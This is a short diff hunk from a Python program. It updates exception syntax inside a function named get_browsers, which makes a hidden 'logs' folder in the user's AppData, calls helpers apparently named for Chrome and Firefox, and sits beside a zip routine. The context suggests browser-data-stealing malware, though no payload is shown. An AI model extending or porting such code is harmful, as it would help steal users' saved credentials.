@@ -835,11 +835,11 @@ def get_browsers():
 		os.mkdir(pathusr+'\\AppData\\Roaming\\logs\\')
 	try:
 		getXpom()
-	except Exception, e:
+	except:
 		pass
 	try:
 		getFire()
-	except Exception, e:
+	except:
 		pass
 
 def zipdir(path, ziph):
